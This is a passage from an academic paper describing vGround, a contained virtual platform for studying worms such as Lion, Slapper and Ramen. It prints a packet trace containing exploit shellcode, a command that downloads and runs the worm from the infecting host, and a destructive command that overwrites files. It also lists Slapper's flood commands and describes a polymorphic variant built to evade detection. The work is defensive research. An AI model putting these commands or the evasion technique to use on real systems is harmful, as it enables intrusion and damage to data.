P
I
f
o
t
e
t
c
o
h
t
r
u
o
f
e
h
T
Seeding Worm
 100
 80
 60
 40
 20
s
s
e
r
d
d
a
P
I
f
o
t
e
t
c
o
h
t
r
u
o
f
e
h
T
Seeding Worm
 100
 80
 60
 40
 20
s
s
e
r
d
d
a
P
I
f
o
t
e
t
c
o
h
t
r
u
o
f
e
h
T
Seeding Worm
 0
 0
 2
 4
The third octet of IP address 
 6
 8
 10
 0
 0
 2
 4
The third octet of IP address 
 6
 8
 10
 0
 0
 2
 4
The third octet of IP address 
 6
 8
 10
(a) When 2% hosts infected
(b) When 5% hosts infected
(c) When 10% hosts infected
Fig. 7. Propagation of Slapper worm variant w/ island-hopping (Total: 1000 hosts)
Virtual Playgrounds for Worm Behavior Investigation
13
VM freezing/resuming, and transparent proxying are also applicable solutions. These
techniques help to increase the probability of hitting a target victim and thus better
exposing a worm’s propagation strategy.
4.3 Detailed Exploitation Steps
In this experiment, we demonstrate the ﬁdelity of vGround in capturing the detailed
exploitation steps at the byte level.
Lion Worm. Figure 8 shows a tcpdump trace generated in the vGround for the Lion
worm experiment in Section 4.1. The trace shows a complete infection process with
network-level details. The initial TCP connection handshake is omitted from the ﬁgure.
The trace shows that the vulnerability in the BIND service [14] is successfully exploited
and a remote shell is created. The byte sequence shown in lines 2, 3 and 4 is exactly the
signature used in snort [8] for Lion worm detection. The trace also shows the sequence
of specially-crafted commands then executed, which result in the transfer and activation
of a worm copy.
Slapper Worm. The Slapper worm is unique in its heap-based exploitation [44].
vGround successfully reproduces the detailed exploits: Initially, a TCP connection is
initiated to verify the reachability of a victim, which is followed, if reachable, by an
invalid HTTP GET request to acquire the version of vulnerable Apache server. Once the
version is obtained, a succession of 20 connections at 100 millisecond intervals exhausts
11:14:44.457068 20.0.3.3.1026 > 20.0.1.2.domain:  43981 inv_q+ [b2&3=0x980] (23) (DF)
...
0x0010   0a00 0102 0402 0035 001f 8ae3 abcd 0980        .......5........
0x0020
0000 0001 0000 0000 0000 0100 0120 2020        ................
0x0030
2002 61
11:14:44.457511 20.0.1.2.domain > 20.0.3.3.1026:  43981 inv_q FormErr [0q] 1/0/0 (Cla
ss 46331) Type0[|domain] (DF)
11:14:44.472424 20.0.3.3.1026 > 20.0.1.2.domain:  43981+ [2q] [1au] A? M-^PM-^PM-^PM-
k;1M-[_M-^CM-o|M-^Mw^PM-^Iw^DM-^MO M-^IO^HM-3^PM-^I^Y1M-IM-1M-^?M-^I^OQ1M-@M-0fM-3^GM
-^IM-yM-MM-^@Y1M-[9M-Xu^JfM-;^D^Af9^^Bt^HM-bM-‘.M-hM-@M-^?M-^?M-^?M-^IM-K1M-IM-1^C1M-
@M-0?IM-MM-^@AM-bM-vM-k^T1M-@[M-^MK^TM-^I^YM-^IC^XM-^HC^G1M-RM-0^KM-MM-^@M-hM-gM-^?M-
^?M-^?/bin/shM-^PM-^PM-^PM-^PM-^PM-^PM-^PM-^P.M-z.M-?.M-^A.@.M-^A.@.^@.^@.M-{.M-?.M-z
.M-?.^@.^@.^@.^@.M-^M.@.M-{.M-?.Q.@.^@.^@.M-{.M-?.^@.^@.^@.^@.^W.^H.^X.^H.^Y.^H.M-{.M
-?.^W.^H.M-|.M-?.^Z.^H.^@.^@.^@.^@.d.^@.^@.^@.^@.^@.M-^@.@.^@.^@.k.^H.^W.^H.M-{.M-?.
(509) (DF)
...
0x0080   31c0 5b8d 4b14 8919 8943 1888 4307 31d2        1.[.K....C..C.1.
0x0090   b00b cd80 e8e7 ffff ff2f 6269 6e2f 7368        ........./bin/sh
...
11:14:44.473328 20.0.1.2.domain > 20.0.3.3.1026:  43981 [2q] 0/0/1 (533) (DF)
11:14:45.547904 20.0.3.3.1025 > 20.0.1.2.domain: P 1:643(642) ack 1 win 5840  (DF)
...
0x0030   0000 1f34 5041 5448 3d27 2f75 7372 2f62        ...4PATH=’/usr/b
0x0040   696e 3a2f 6269 6e3a 2f75 7372 2f6c 6f63        in:/bin:/usr/loc
0x0050   616c 2f62 696e 2f3a 2f75 7372 2f73 6269        al/bin/:/usr/sbi
0x0060   6e2f 3a2f 7362 696e 273b 6578 706f 7274        n/:/sbin’;export
0x0070   2050 4154 483b 6578 706f 7274 2054 4552        .PATH;export.TER
...
0x01f0   746d 6c3b 6563 686f 2027 2321 2f62 696e        tml;echo.’#!/bin
0x0200   2f73 6827 203e 206c 696f 6e3b 6563 686f        /sh’.>.lion;echo
0x0210   2027 6e6f 6875 7020 6669 6e64 202f 202d        .’nohup.find./.-
0x0220   6e61 6d65 2022 696e 6465 782e 6874 6d6c        name."index.html
0x0230   2220 2d65 7865 6320 2f62 696e 2f63 7020        ".-exec./bin/cp.
0x0240   696e 6465 782e 6874 6d6c 207b 7d20 5c3b        index.html.{}.\;
0x0250   273e 3e6c 696f 6e3b 6563 686f 2027 7461        ’>>lion;echo.’ta
0x0260   7220 2d78 6620 3169 306e 2e74 6172 273e        r.-xf.1i0n.tar’>
0x0270   3e6c 696f 6e3b 6563 686f 2027 2e2f 3169        >lion;echo.’./1i
0x0280   306e 2e73 6827 203e 3e6c 696f 6e3b 6563        0n.sh’.>>lion;ec
0x0290   686f 203e 3e6c 696f 6e3b 6563 686f 203e        ho.>>lion;echo.>
0x02a0   3e6c 696f 6e3b 6368 6d6f 6420 3735 3520        >lion;chmod.755.
0x02b0   6c69 6f6e 3b0a                                 lion;.
...
11:14:45.548031 20.0.1.2.domain > 20.0.3.3.1025: . ack 643 win 7062  (DF)
11:14:45.550886 20.0.3.3.1025 > 20.0.1.2.domain: P 643:770(127) ack 1 win 5840  (DF)
...
0x0030   0000 1fa5 5445 524d 3d27 6c69 6e75 7827        ....TERM=’linux’
0x0040   0a65 7870 6f72 7420 5041 5448 3d27 2f73        .export.PATH=’/s
0x0050   6269 6e3a 2f75 7372 2f73 6269 6e3a 2f62        bin:/usr/sbin:/b
0x0060   696e 3a2f 7573 722f 6269 6e3a 2f75 7372        in:/usr/bin:/usr
0x0070   2f6c 6f63 616c 2f62 696e 270a 6c79 6e78        /local/bin’.lynx
0x0080   202d 736f 7572 6365 2068 7474 703a 2f2f        .-source.http://
0x0090   3230 2e30 2e33 2e33 3a32 3733 3734 203e        20.0.3.3:27374.>
0x00a0   2031 6930 6e2e 7461 723b 2e2f 6c69 6f6e        .1i0n.tar;./lion
...
11:14:45.550949 20.0.1.2.domain > 20.0.3.3.1025: . ack 770 win 7062  (DF)
Fig. 8. Exploitation details of the Lion worm
14
X. Jiang et al.
Fig. 9. Exploitation details of the Slapper worm
Apache’s pool of server and thus forces the creation of two fresh processes when serving
the next two SSL connections. The purpose of “forking” two fresh processes is to have
the same heap structures within them and thus prepare for the ﬁnal two SSL handshake
exploitations. The ﬁrst SSL connection exploits the vulnerability to obtain the exact
location of affected heap allocation, and it is used in the second SSL connection to
correctly patch attack buffer. The second SSL connection re-triggers the heap-based
buffer overﬂow which transfers to the control of the just-patched attack buffer.
Due to space constraint, we do not show the full vGround traces during the above
exploitation process. Instead, the trace in the ﬁnal stage of the attack is shown in
Figure 9. From the decoded area of Figure 9, it is interesting to see that the worm
source is transferred in the uuencoded2 format.
4.4 Malicious Payload
A worm’s payload reveals the intention of the worm author and often leads to
destructive impact. The vGround is an ideal venue to invoke the malicious payload,
because the consequent damage will be conﬁned within the vGround. Moreover, the
vGround will be easily recoverable due to the all-software user-level implementation.
The following string is found in the Lion worm trace in Figure 8: ﬁnd / -name
“index.html” -exec /bin/cp index.html {} \;. The Lion worm recursively searches for
all index.html ﬁles starting from the “/” root directory and replaces them with a built-in
web page. This malicious payload is conﬁrmed by our forensic analysis enabled by the
vGround post-infection trace collection service (Section 3.4). We also run an earlier
version of the Lion worm in a separate vGround. We observe that the Lion worm
carries and installs an infamous rootkit - t0rn [28], which will destroy the infected
2 Uuencode, or the full name “Unix to Unix Encoding”, represents a method or tool for
converting ﬁles from binary to ASCII(text) so that they can be sent across the Internet via
email.
Virtual Playgrounds for Worm Behavior Investigation
15
[root@c1_2 /root]#pudclient 127.0.0.1
PUD Client version 11092002Ready, type in the 
commands as follows, or type help for a list:
help
The commands are:
  * kill      kills the daemon
  * log       log output to file
  * bounce    adds a bounce
  * close     closes a bounce
  * info      requests info
  * list      lists the current servers
  * sh        execs a command
  * udpflood  send a udp flood
  * tcpflood  send a tcp flood
  * dnsflood  send a dns flood
  * escan     scans hard drive for emails
Fig. 10. Payloads of the Slapper worm
host. Without full-system virtualization, such kernel-level damage cannot be easily
reproduced. Furthermore, the vGround contains the damage and makes the system re-
installation fast and easy.
The Slapper worm does not destroy local disk content like the Lion worm. It is
more advanced in self-organizing worm-infected hosts into a P2P attack network. In
the vGround for the Slapper worm, we are able to observe the operations of this P2P
network. More speciﬁcally, we deploy a special client [19] in one of the end hosts. The
special client will issue commands (listed in Figure 10) to the infected hosts. Meanwhile,
each Slapper worm carries a DDoS payload component [19]. In the vGround, we are
able to issue commands such as list, udpﬂood, and tcpﬂood via the special client. The
vGround traces indicate that a command is propagated among the infected hosts in a P2P
fashion, rather than being sent directly from the special client. The vGround provides a
convenient environment to further investigate such advanced attack strategy.
4.5 Advanced Worm Experiments
In this section, we present a number of more advanced experiments where vGrounds
demonstrate unique advantages over other worm experiment environments.
Multi-vector Worms. Multi-vector worms are able to infect via multiple infection
vectors (IVs). In this experiment, we run the Ramen worm [3, 17], which carries
three different IVs in three different services, including LPRng (CVE-2000-0917), wu-
ftpd (CVE-2000-0573), and rpc.statd (CVE-2000-0666). A vGround with 1000 virtual
nodes running these services is created and only one seed Ramen worm is planted. Over
the time, however, we notice different infection attempts based on all three IVs.
Interestingly, our vGround experiments reveal that the Ramen exploitation code for
the vulnerable wu-ftpd server is ﬂawed - a result not mentioned in popular bulletins [3]
and [17]. To conﬁrm, we also use the same exploitation code against a real machine
running a vulnerable FTP server (wu-ftpd-2.6.0-3). The result agrees with the vGround
result.
Stealthy/Polymorphic Worms. Using various polymorphic engines [34], worms can
become extremely stealthy. The modeling and detection of stealthy behavior or
16
X. Jiang et al.
polymorphic appearances require much longer time and larger playground scale.
Furthermore, it is hard, if not impossible, for worm simulators [39] to experiment
polymorphic worms.
We have synthesized a polymorphic worm based on the original Slapper worm. We
use it to evaluate the effectiveness of signature-based worm detection schemes. As
shown in Section 4.3, the Slapper worm will transfer an uuencoded version of the worm
source code after a successful exploitation. Our polymorphic Slapper ﬁrst attempts
to encrypt the source using the OpenSSL tool before transmission. The encryption
password is randomly generated and is then XOR’ed with a shared key. Finally, the
resultant value is prepended to the encrypted worm source ﬁle for transmission. Our
vGround experiments show that snort [8] is no longer able to detect the worm3. The
same worm could also be used to test the signatures generated by various signature
extraction algorithms [42, 35, 37].
Routing Worms. The vGround can also be used to study the relation between worm
propagations and the underlying routing infrastructure. We have recently synthesized
the routing worm introduced in [52]. The routing worm takes advantage of the
information in BGP routing tables to reduce its scanning space, without missing
any potential target. With its network virtualization and real-world routing protocol
support, the vGround provides a new venue to study (at least qualitatively) such an
infrastructure-aware worm and the corresponding defense mechanisms.
5 Limitations and Extensions
It has been noted [11] that a UML-based VM exposes certain system-wide footprints.
For example, the content in /proc/cmdline can reveal the command parameters when
a UML VM is started and the command parameters contain some UML-speciﬁc infor-
mation (e.g., the special root device ubd0). Such deﬁciency may undesirably disclose
the existence of vGround. As a counter-measure, methods have been proposed [27] to
minimize such VM-speciﬁc footprints. However, this is not the end of the problem.
Instead, it may lead to another round of “arms race”. From another perspective, an
interesting trend is that VMs, including UML VMs, are increasingly used for general
computing purposes such as web hosting, education, and Grid computing [30, 43]. If
such trend prevails, the arms race tension may be mitigated because a worm might as
well infect a VM in such a “mixed-reality” cyberspace.
In addition, the conﬁned nature of vGround may turn out disabling some worm
experiments where the worm has to communicate with hosts outside the vGround
to “succeed”. For example, the Santy worm [22] relies on the Google search engine
to locate targets for infection and it can be effectively mitigated by ﬁltering the
worm-related queries [20]. However, the vGround cannot be readily used to safely
observe the dynamics of such worms4. Although the vGround platform does have the